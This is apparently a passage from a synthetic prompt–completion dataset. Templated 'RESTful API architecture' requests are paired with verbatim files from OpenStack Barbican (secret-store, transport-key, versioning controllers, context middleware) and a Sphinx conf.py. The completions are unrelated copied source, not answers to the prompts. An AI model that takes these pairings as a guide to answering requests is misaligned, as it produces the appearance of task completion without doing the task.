_preferred_secret_store_not_found():\n    \"\"\"Throw exception indicating preferred secret store not found.\"\"\"\n    pecan.abort(404, u._('Not Found. No preferred secret store defined for '\n                         'this project.'))\n\n\ndef _multiple_backends_not_enabled():\n    \"\"\"Throw exception indicating multiple backends support is not enabled.\"\"\"\n    pecan.abort(404, u._('Not Found. Multiple backends support is not enabled '\n                         'in service configuration.'))\n\n\ndef convert_secret_store_to_response_format(secret_store):\n    data = secret_store.to_dict_fields()\n    data['secret_store_plugin'] = data.pop('store_plugin')\n    data['secret_store_ref'] = hrefs.convert_secret_stores_to_href(\n        data['secret_store_id'])\n    # no need to pass store id as secret_store_ref is returned\n    data.pop('secret_store_id', None)\n    return data\n\n\nclass PreferredSecretStoreController(controllers.ACLMixin):\n    \"\"\"Handles preferred secret store set/removal requests.\"\"\"\n\n    def __init__(self, secret_store):\n        LOG.debug('=== Creating PreferredSecretStoreController ===')\n        super().__init__()\n        self.secret_store = secret_store\n        self.proj_store_repo = repo.get_project_secret_store_repository()\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='DELETE', template='json')\n    @controllers.handle_exceptions(u._('Removing preferred secret store'))\n    @controllers.enforce_rbac('secretstore_preferred:delete')\n    def on_delete(self, external_project_id, **kw):\n        LOG.debug('Start: Remove project preferred secret-store for store'\n                  ' id %s', self.secret_store.id)\n\n        project = res.get_or_create_project(external_project_id)\n\n        project_store = self.proj_store_repo.get_secret_store_for_project(\n            project.id, None, suppress_exception=True)\n        if project_store is None:\n            _preferred_secret_store_not_found()\n\n        self.proj_store_repo.delete_entity_by_id(\n            entity_id=project_store.id,\n            external_project_id=external_project_id)\n        pecan.response.status = 204\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('Setting preferred secret store'))\n    @controllers.enforce_rbac('secretstore_preferred:post')\n    def on_post(self, external_project_id, **kwargs):\n        LOG.debug('Start: Set project preferred secret-store for store '\n                  'id %s', self.secret_store.id)\n\n        project = res.get_or_create_project(external_project_id)\n\n        self.proj_store_repo.create_or_update_for_project(project.id,\n                                                          self.secret_store.id)\n\n        pecan.response.status = 204\n\n\nclass SecretStoreController(controllers.ACLMixin):\n    \"\"\"Handles secret store retrieval requests.\"\"\"\n\n    def __init__(self, secret_store):\n        LOG.debug('=== Creating SecretStoreController ===')\n        super().__init__()\n        self.secret_store = secret_store\n\n    @pecan.expose()\n    def _lookup(self, action, *remainder):\n        if (action == 'preferred'):\n            return PreferredSecretStoreController(self.secret_store), remainder\n        else:\n            pecan.abort(405)\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Secret store retrieval'))\n    @controllers.enforce_rbac('secretstore:get')\n    def on_get(self, external_project_id):\n        LOG.debug(\"== Getting secret store for %s\", self.secret_store.id)\n        return convert_secret_store_to_response_format(self.secret_store)\n\n\nclass SecretStoresController(controllers.ACLMixin):\n    \"\"\"Handles secret-stores list requests.\"\"\"\n\n    def __init__(self):\n        LOG.debug('Creating SecretStoresController')\n        super().__init__()\n        self.secret_stores_repo = repo.get_secret_stores_repository()\n        self.proj_store_repo = repo.get_project_secret_store_repository()\n\n    def __getattr__(self, name):\n        route_table = {\n            'global-default': self.get_global_default,\n            'preferred': self.get_preferred,\n        }\n        if name in route_table:\n            return route_table[name]\n        raise AttributeError\n\n    @pecan.expose()\n    def _lookup(self, secret_store_id, *remainder):\n        if not utils.is_multiple_backends_enabled():\n            _multiple_backends_not_enabled()\n\n        secret_store = self.secret_stores_repo.get(entity_id=secret_store_id,\n                                                   suppress_exception=True)\n        if not secret_store:\n            _secret_store_not_found()\n        return SecretStoreController(secret_store), remainder\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('List available secret stores'))\n    @controllers.enforce_rbac('secretstores:get')\n    def on_get(self, external_project_id, **kw):\n        LOG.debug('Start SecretStoresController on_get: listing secret '\n                  'stores')\n        if not utils.is_multiple_backends_enabled():\n            _multiple_backends_not_enabled()\n\n        res.get_or_create_project(external_project_id)\n\n        secret_stores = self.secret_stores_repo.get_all()\n\n        resp_list = []\n        for store in secret_stores:\n            item = convert_secret_store_to_response_format(store)\n            resp_list.append(item)\n\n        resp = {'secret_stores': resp_list}\n\n        return resp\n\n    @pecan.expose(generic=True, template='json')\n    @controllers.handle_exceptions(u._('Retrieve global default secret store'))\n    @controllers.enforce_rbac('secretstores:get_global_default')\n    def get_global_default(self, external_project_id, **kw):\n        LOG.debug('Start secret-stores get global default secret store')\n\n        if not utils.is_multiple_backends_enabled():\n            _multiple_backends_not_enabled()\n\n        res.get_or_create_project(external_project_id)\n\n        store = multiple_backends.get_global_default_secret_store()\n\n        return convert_secret_store_to_response_format(store)\n\n    @pecan.expose(generic=True, template='json')\n    @controllers.handle_exceptions(u._('Retrieve project preferred store'))\n    @controllers.enforce_rbac('secretstores:get_preferred')\n    def get_preferred(self, external_project_id, **kw):\n        LOG.debug('Start secret-stores get preferred secret store')\n\n        if not utils.is_multiple_backends_enabled():\n            _multiple_backends_not_enabled()\n\n        project = res.get_or_create_project(external_project_id)\n\n        project_store = self.proj_store_repo.get_secret_store_for_project(\n            project.id, None, suppress_exception=True)\n\n        if project_store is None:\n            _preferred_secret_store_not_found()\n\n        return convert_secret_store_to_response_format(\n            project_store.secret_store)\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/secretstores.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.6799999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 218}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2014 Red Hat, Inc.\n#\n#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport pecan\nfrom urllib import parse\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.common import exception\nfrom barbican.common import hrefs\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\nfrom barbican.model import models\nfrom barbican.model import repositories as repo\n\nLOG = utils.getLogger(__name__)\n\n\ndef _transport_key_not_found():\n    \"\"\"Throw exception indicating transport key not found.\"\"\"\n    pecan.abort(404, u._('Not Found. Transport Key not found.'))\n\n\ndef _invalid_transport_key_id():\n    \"\"\"Throw exception indicating transport key id is invalid.\"\"\"\n    pecan.abort(404, u._('Not Found. Provided transport key id is invalid.'))\n\n\nclass TransportKeyController(controllers.ACLMixin):\n    \"\"\"Handles transport key retrieval requests.\"\"\"\n\n    def __init__(self, transport_key_id, transport_key_repo=None):\n        LOG.debug('=== Creating TransportKeyController ===')\n        super().__init__()\n        self.transport_key_id = transport_key_id\n        self.repo = transport_key_repo or repo.TransportKeyRepo()\n\n    @pecan.expose(generic=True)\n    def index(self, external_project_id, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET')\n    @controllers.handle_exceptions(u._('Transport Key retrieval'))\n    @controllers.enforce_rbac('transport_key:get')\n    def on_get(self, external_project_id):\n        LOG.debug(\"== Getting transport key for %s\", external_project_id)\n        transport_key = self.repo.get(entity_id=self.transport_key_id)\n        if not transport_key:\n            _transport_key_not_found()\n\n        pecan.override_template('json', 'application/json')\n        return transport_key\n\n    @index.when(method='DELETE')\n    @controllers.handle_exceptions(u._('Transport Key deletion'))\n    @controllers.enforce_rbac('transport_key:delete')\n    def on_delete(self, external_project_id, **kwargs):\n        LOG.debug(\"== Deleting transport key ===\")\n        try:\n            self.repo.delete_entity_by_id(\n                entity_id=self.transport_key_id,\n                external_project_id=external_project_id)\n            # TODO(alee) response should be 204 on success\n            # pecan.response.status = 204\n        except exception.NotFound:\n            LOG.exception('Problem deleting transport_key')\n            _transport_key_not_found()\n\n\nclass TransportKeysController(controllers.ACLMixin):\n    \"\"\"Handles transport key list requests.\"\"\"\n\n    def __init__(self, transport_key_repo=None):\n        LOG.debug('Creating TransportKeyController')\n        super().__init__()\n        self.repo = transport_key_repo or repo.TransportKeyRepo()\n        self.validator = validators.NewTransportKeyValidator()\n\n    @pecan.expose()\n    def _lookup(self, transport_key_id, *remainder):\n        if not utils.validate_id_is_uuid(transport_key_id):\n            _invalid_transport_key_id()\n        return TransportKeyController(transport_key_id, self.repo), remainder\n\n    @pecan.expose(generic=True)\n    def index(self, external_project_id, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Transport Key(s) retrieval'))\n    @controllers.enforce_rbac('transport_keys:get')\n    def on_get(self, external_project_id, **kw):\n        LOG.debug('Start transport_keys on_get')\n\n        plugin_name = kw.get('plugin_name', None)\n        if plugin_name is not None:\n            plugin_name = parse.unquote_plus(plugin_name)\n\n        result = self.repo.get_by_create_date(\n            plugin_name=plugin_name,\n            offset_arg=kw.get('offset', 0),\n            limit_arg=kw.get('limit', None),\n            suppress_exception=True\n        )\n\n        transport_keys, offset, limit, total = result\n\n        if not transport_keys:\n            transport_keys_resp_overall = {'transport_keys': [],\n                                           'total': total}\n        else:\n            transport_keys_resp = [\n                hrefs.convert_transport_key_to_href(s.id)\n                for s in transport_keys\n            ]\n            transport_keys_resp_overall = hrefs.add_nav_hrefs(\n                'transport_keys',\n                offset,\n                limit,\n                total,\n                {'transport_keys': transport_keys_resp}\n            )\n            transport_keys_resp_overall.update({'total': total})\n\n        return transport_keys_resp_overall\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('Transport Key Creation'))\n    @controllers.enforce_rbac('transport_keys:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n        LOG.debug('Start transport_keys on_post')\n\n        # TODO(alee) POST should determine the plugin name and call the\n        # relevant get_transport_key() call.  We will implement this once\n        # we figure out how the plugins will be enumerated.\n\n        data = api.load_body(pecan.request, validator=self.validator)\n\n        new_key = models.TransportKey(data.get('plugin_name'),\n                                      data.get('transport_key'))\n\n        self.repo.create_from(new_key)\n\n        url = hrefs.convert_transport_key_to_href(new_key.id)\n        LOG.debug('URI to transport key is %s', url)\n\n        pecan.response.status = 201\n        pecan.response.headers['Location'] = url\n\n        return {'transport_key_ref': url}\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/transportkeys.py", "language": "python", "complexity": "medium", "star_count": 241, "quality_score": 0.6799999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 164}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport pecan\nfrom urllib import parse\n\nfrom barbican.api import controllers\nfrom barbican.api.controllers import containers\nfrom barbican.api.controllers import orders\nfrom barbican.api.controllers import quotas\nfrom barbican.api.controllers import secrets\nfrom barbican.api.controllers import secretstores\nfrom barbican.api.controllers import transportkeys\nfrom barbican.common import utils\nfrom barbican import i18n as u\nfrom barbican import version\n\nLOG = utils.getLogger(__name__)\n\n_MIN_MICROVERSION = 0\n_MAX_MICROVERSION = 1\n_LAST_UPDATED = '2021-02-10T00:00:00Z'\n\n# NOTE(xek): The above defines the minimum and maximum version of the API\n# across all of the v1 REST API.\n# When introducing a new microversion, the _MAX_MICROVERSION\n# needs to be incremented by 1 and the _LAST_UPDATED string updated.\n# Additionally, the new microversion has to be documented in\n# doc/source/api/microversion_history.rst\n#\n# The following is the complete (ordered) list of supported versions\n# used by the microversion middleware to parse what is allowed and\n# supported.\n\nVERSIONS = ['1.{}'.format(v) for v in range(_MIN_MICROVERSION,\n                                            _MAX_MICROVERSION + 1)]\nMIN_API_VERSION = VERSIONS[0]\nMAX_API_VERSION = VERSIONS[-1]\n\nMIME_TYPE_JSON = 'application/json'\nMIME_TYPE_JSON_HOME = 'application/json-home'\nMEDIA_TYPE_JSON = 'application/vnd.openstack.key-manager-%s+json'\n\n\ndef is_supported(req, min_version=MIN_API_VERSION,\n                 max_version=MAX_API_VERSION):\n    \"\"\"Check if API request version satisfies version restrictions.\n\n    :param req: request object\n    :param min_version: minimal version of API needed for correct\n           request processing\n    :param max_version: maximum version of API needed for correct\n           request processing\n\n    :returns: True if request satisfies minimal and maximum API version\n             requirements. False in other case.\n    \"\"\"\n    requested_version = str(req.environ.get('key-manager.microversion',\n                                            MIN_API_VERSION))\n\n    return (VERSIONS.index(max_version) >=\n            VERSIONS.index(requested_version) >=\n            VERSIONS.index(min_version))\n\n\ndef _version_not_found():\n    \"\"\"Throw exception indicating version not found.\"\"\"\n    pecan.abort(404, u._(\"The version you requested wasn't found\"))\n\n\ndef _get_versioned_url(version):\n    if version[-1] != '/':\n        version += '/'\n    # If host_href is not set in barbican conf, then derive it from request url\n    host_part = utils.get_base_url_from_request()\n    if host_part[-1] != '/':\n        host_part += '/'\n    return parse.urljoin(host_part, version)\n\n\nclass BaseVersionController(object):\n    \"\"\"Base class for the version-specific controllers\"\"\"\n\n    @classmethod\n    def get_version_info(cls, microversion_spec=True):\n        version = {\n            'id': cls.version_id,\n            'status': 'CURRENT',\n            'min_version': cls.min_version,\n            'max_version': cls.version,\n            'links': [\n                {\n                    'rel': 'self',\n                    'href': _get_versioned_url(cls.version_string),\n                },\n                {\n                    'rel': 'describedby',\n                    'type': 'text/html',\n                    'href': 'https://docs.openstack.org/'\n                }\n            ],\n        }\n        if not microversion_spec:\n            version.pop('min_version')\n            version.pop('max_version')\n            version['status'] = 'stable'\n            version['updated']: cls.last_updated\n            version['media-types'] = [\n                {\n                    'base': MIME_TYPE_JSON,\n                    'type': MEDIA_TYPE_JSON % cls.version_string\n                }\n            ]\n        return version\n\n\nclass V1Controller(BaseVersionController):\n    \"\"\"Root controller for the v1 API\"\"\"\n\n    version_string = 'v1'\n\n    # NOTE(jaosorior): We might start using decimals in the future, meanwhile\n    # this is the same as the version string.\n    version_id = 'v1'\n\n    version = MAX_API_VERSION\n    min_version = MIN_API_VERSION\n    last_updated = _LAST_UPDATED\n\n    def __init__(self):\n        LOG.debug('=== Creating V1Controller ===')\n        self.secrets = secrets.SecretsController()\n        self.orders = orders.OrdersController()\n        self.containers = containers.ContainersController()\n        self.transport_keys = transportkeys.TransportKeysController()\n        self.quotas = quotas.QuotasController()\n        setattr(self, 'project-quotas', quotas.ProjectsQuotasController())\n        setattr(self, 'secret-stores', secretstores.SecretStoresController())\n\n    @pecan.expose(generic=True)\n    def index(self):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @utils.allow_certain_content_types(MIME_TYPE_JSON, MIME_TYPE_JSON_HOME)\n    @controllers.handle_exceptions(u._('Version retrieval'))\n    def on_get(self):\n        pecan.core.override_template('json')\n        if is_supported(pecan.request, max_version='1.0'):\n            return {'version': self.get_version_info(microversion_spec=False)}\n        else:\n            return {'version': self.get_version_info()}\n\n\nAVAILABLE_VERSIONS = {\n    V1Controller.version_string: V1Controller,\n}\n\nDEFAULT_VERSION = V1Controller.version_string\n\n\nclass VersionsController(object):\n\n    def __init__(self):\n        LOG.debug('=== Creating VersionsController ===')\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @utils.allow_certain_content_types(MIME_TYPE_JSON, MIME_TYPE_JSON_HOME)\n    def on_get(self, **kwargs):\n        \"\"\"The list of versions is dependent on the context.\"\"\"\n        self._redirect_to_default_json_home_if_needed(pecan.request)\n\n        if 'build' in kwargs:\n            return {'build': version.__version__}\n\n        if is_supported(pecan.request, max_version='1.0'):\n            resp = {\n                'versions': {\n                    'values': [\n                        V1Controller.get_version_info(microversion_spec=False)\n                    ]\n                }\n            }\n        else:\n            resp = {\n                'versions': [\n                    version_cls.get_version_info() for version_cls in\n                    AVAILABLE_VERSIONS.values()]\n            }\n\n        # Since we are returning all the versions available, the proper status\n        # code is Multiple Choices (300)\n        pecan.response.status = 300\n        return resp\n\n    def _redirect_to_default_json_home_if_needed(self, request):\n        if self._mime_best_match(request.accept) == MIME_TYPE_JSON_HOME:\n            url = _get_versioned_url(DEFAULT_VERSION)\n            LOG.debug(\"Redirecting Request to \" + url)\n            # NOTE(jaosorior): This issues an \"external\" redirect because of\n            # two reasons:\n            # * This module doesn't require authorization, and accessing\n            #   specific version info needs that.\n            # * The resource is a separate app_factory and won't be found\n            #   internally\n            pecan.redirect(url, request=request)\n\n    def _mime_best_match(self, accept):\n        if not accept:\n            return MIME_TYPE_JSON\n\n        SUPPORTED_TYPES = [MIME_TYPE_JSON, MIME_TYPE_JSON_HOME]\n        return accept.best_match(SUPPORTED_TYPES)\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/versions.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.65, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 227}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2011-2012 OpenStack LLC.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\nimport webob.exc\n\nfrom barbican.api import middleware as mw\nfrom barbican.common import config\nfrom barbican.common import utils\nimport barbican.context\nfrom barbican import i18n as u\n\nLOG = utils.getLogger(__name__)\nCONF = config.CONF\n\n\nclass BaseContextMiddleware(mw.Middleware):\n    def process_request(self, req):\n        request_id = req.headers.get('x-openstack-request-id')\n        if not request_id:\n            request_id = 'req-' + utils.generate_uuid()\n        setattr(req, 'request_id', request_id)\n        LOG.info('Begin processing request %(request_id)s',\n                 {'request_id': request_id})\n\n    def process_response(self, resp):\n\n        resp.headers['x-openstack-request-id'] = resp.request.request_id\n\n        LOG.info('Processed request: %(status)s - %(method)s %(url)s',\n                 {\"status\": resp.status,\n                  \"method\": resp.request.method,\n                  \"url\": resp.request.url})\n        return resp\n\n\nclass ContextMiddleware(BaseContextMiddleware):\n    def __init__(self, app):\n        super(ContextMiddleware, self).__init__(app)\n\n    def process_request(self, req):\n        \"\"\"Convert authentication information into a request context\n\n        Generate a barbican.context.RequestContext object from the available\n        authentication headers and store on the 'context' attribute\n        of the req object.\n\n        :param req: wsgi request object that will be given the context object\n        :raises webob.exc.HTTPUnauthorized: when value of the X-Identity-Status\n                                            header is not 'Confirmed' and\n                                            anonymous access is disallowed\n        \"\"\"\n        super(ContextMiddleware, self).process_request(req)\n\n        if req.headers.get('X-Identity-Status') == 'Confirmed':\n            req.context = self._get_authenticated_context(req)\n        elif CONF.allow_anonymous_access:\n            req.context = self._get_anonymous_context()\n            LOG.debug(\"==== Inserted barbican unauth \"\n                      \"request context: %s ====\", req.context.to_dict())\n        else:\n            raise webob.exc.HTTPUnauthorized()\n\n        # Ensure that down wind mw.Middleware/app can see this context.\n        req.environ['barbican.context'] = req.context\n\n    def _get_anonymous_context(self):\n        kwargs = {\n            'user_id': None,\n            'project_id': None,\n            'is_admin': False,\n            'read_only': True,\n        }\n        return barbican.context.RequestContext(**kwargs)\n\n    def _get_authenticated_context(self, req):\n        ctx = barbican.context.RequestContext.from_environ(req.environ)\n\n        if ctx.project_id is None:\n            LOG.debug(\"X_PROJECT_ID not found in request\")\n            raise webob.exc.HTTPUnauthorized()\n\n        ctx.is_admin = CONF.admin_role.strip().lower() in ctx.roles\n\n        return ctx\n\n\nclass UnauthenticatedContextMiddleware(BaseContextMiddleware):\n    def _get_project_id_from_header(self, req):\n        project_id = req.headers.get('X-Project-Id')\n        if not project_id:\n            accept_header = req.headers.get('Accept')\n            if not accept_header:\n                req.headers['Accept'] = 'text/plain'\n            raise webob.exc.HTTPBadRequest(detail=u._('Missing X-Project-Id'))\n\n        return project_id\n\n    def process_request(self, req):\n        \"\"\"Create a context without an authorized user.\"\"\"\n        super(UnauthenticatedContextMiddleware, self).process_request(req)\n\n        project_id = self._get_project_id_from_header(req)\n\n        config_admin_role = CONF.admin_role.strip().lower()\n        roles_header = req.headers.get('X-Roles', '')\n        roles = [r.strip().lower() for r in roles_header.split(',') if r]\n\n        # If a role wasn't specified we default to admin\n        if not roles:\n            roles = [config_admin_role]\n\n        kwargs = {\n            'user_id': req.headers.get('X-User-Id'),\n            'domain_id': req.headers.get('X-Domain-Id'),\n            'user_domain_id': req.headers.get('X-User-Domain-Id'),\n            'project_domain_id': req.headers.get('X-Project-Domain-Id'),\n            'project_id': project_id,\n            'roles': roles,\n            'is_admin': config_admin_role in roles,\n            'request_id': req.request_id\n        }\n\n        context = barbican.context.RequestContext(**kwargs)\n\n        req.environ['barbican.context'] = context\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/middleware/context.py", "language": "python", "complexity": "medium", "star_count": 241, "quality_score": 0.6799999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 137}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# -*- coding: utf-8 -*-\n#\n# RESTful API Deisgn build configuration file, created by\n# sphinx-quickstart on Mon Jul 25 09:21:34 2011.\n#\n# This file is execfile()d with the current directory set to its containing dir.\n#\n# Note that not all possible configuration values are present in this\n# autogenerated file.\n#\n# All configuration values have a default; values that are commented out\n# serve to show the default.\n\nimport sys, os\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\n#sys.path.insert(0, os.path.abspath('.'))\n\n# -- General configuration -----------------------------------------------------\n\n# If your documentation needs a minimal Sphinx version, state it here.\n#needs_sphinx = '1.0'\n\n# Add any Sphinx extension module names here, as strings. They can be extensions\n# coming with Sphinx (named 'sphinx.ext.*') or your custom ones.\nextensions = []\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = ['_templates']\n\n# The suffix of source filenames.\nsource_suffix = '.rst'\n\n# The encoding of source files.\n#source_encoding = 'utf-8-sig'\n\n# The master toctree document.\nmaster_doc = 'index'\n\n# General information about the project.\nproject = u'RESTful API Design'\ncopyright = u'2011, Geert Jansen'\n\n# The version info for the project you're documenting, acts as replacement for\n# |version| and |release|, also used in various other places throughout the\n# built documents.\n#\n# The short X.Y version.\nversion = '1.0'\n# The full version, including alpha/beta/rc tags.\nrelease = '1.0'\n\n# The language for content autogenerated by Sphinx. Refer to documentation\n# for a list of supported languages.\n#language = None\n\n# There are two options for replacing |today|: either, you set today to some\n# non-false value, then it is used:\n#today = ''\n# Else, today_fmt is used as the format for a strftime call.\n#today_fmt = '%B %d, %Y'\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\nexclude_patterns = ['_build']\n\n# The reST default role (used for this markup: `text`) to use for all documents.\n#default_role = None\n\n# If true, '()' will be appended to :func: etc. cross-reference text.\n#add_function_parentheses = True\n\n# If true, the current module name will be prepended to all description\n# unit titles (such as .. function::).\n#add_module_names = True\n\n# If true, sectionauthor and moduleauthor directives will be shown in the\n# output. They are ignored by default.\n#show_authors = False\n\n# The name of the Pygments (syntax highlighting) style to use.\npygments_style = 'sphinx'\nhighlight_language = 'guess'\n\n# A list of ignored prefixes for module index sorting.\n#modindex_common_prefix = []\n\n\n# -- Options for HTML output ---------------------------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\nhtml_theme = 'agogo'\n\n# Theme options are theme-specific and customize the look and feel of a theme\n# further.  For a list of options available for each theme, see the\n# documentation.\n#html_theme_options = {}\n\n# Add any paths that contain custom themes here, relative to this directory.\n#html_theme_path = []\n\n# The name for this set of Sphinx documents.  If None, it defaults to\n# \"<project> v<release> documentation\".\n#html_title = 'Thoughts on RESTful API Design'\nhtml_title = ''\n\n# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n#html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32\n# pixels large.\n#html_favicon = None\n\n# Add any paths that contain custom static files (such as style sheets) here,\n# relative to this directory. They are copied after the builtin static files,\n# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n#html_last_updated_fmt = '%b %d, %Y'\n\n# If true, SmartyPants will be used to convert quotes and dashes to\n# typographically correct entities.\n#html_use_smartypants = True\n\n# Custom sidebar templates, maps document names to template names.\n#html_sidebars = {}\n\n# Additional templates that should be rendered to pages, maps page names to\n# template names.\n#html_additional_pages = {}\n\n# If false, no module index is generated.\n#html_domain_indices = True\n\n# If false, no index is generated.\n#html_use_index = True\n\n# If true, the index is split into individual pages for each letter.\n#html_split_index = False\n\n# If true, links to the reST sources are added to the pages.\n#html_show_sourcelink = True\n\n# If true, \"Created using Sphinx\" is shown in the HTML footer. Default is True.\n#html_show_sphinx = True\n\n# If true, \"(C) Copyright ...\" is shown in the HTML footer. Default is True.\n#html_show_copyright = True\n\n# If true, an OpenSearch description file will be output, and all pages will\n# contain a <link> tag referring to it.  The value of this option must be the\n# base URL from which the finished HTML is served.\n#html_use_opensearch = ''\n\n# This is the file name suffix for HTML files (e.g. \".xhtml\").\n#html_file_suffix = None\n\n# Output file base name for HTML help builder.\nhtmlhelp_basename = 'restful-api-design'\n\n\n# -- Options for LaTeX output --------------------------------------------------\n\n# The paper size ('letter' or 'a4').\n#latex_paper_size = 'letter'\n\n# The font size ('10pt', '11pt' or '12pt').\n#latex_font_size = '10pt'\n\n# Grouping the document tree into LaTeX files. List of tuples\n# (source start file, target name, title, author, documentclass [howto/manual]).\nlatex_documents = [\n  ('index', 'restful-api-design.tex', u'Thoughts on RESTful API design',\n   u'Geert Jansen', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n# For \"manual\" documents, if this is true, then toplevel headings are parts,\n# not chapters.\n#latex_use_parts = False\n\n# If true, show page references after internal links.\n#latex_show_pagerefs = False\n\n# If true, show URL addresses after external links.\n#latex_show_urls = False\n\n# Additional stuff for the LaTeX preamble.\n#latex_preamble = ''\n\n# Documents to append as an appendix to all manuals.\n#latex_appendices = []\n\n# If false, no module index is generated.\n#latex_domain_indices = True\n\n\n# -- Options for manual page output --------------------------------------------\n\n# One entry per manual page. List of tuples\n# (source start file, name, description, authors, manual section).\nman_pages = [\n    ('index', 'restful-api-design', u'Thoughts on RESTful API design',\n     [u'Geert Jansen'], 1)\n]\n", "metadata": {"source": "github.com/geertj/restful-api-design", "file_path": "conf.py", "language": "python", "complexity": "complex", "star_count": 217, "quality_score": 0.62, 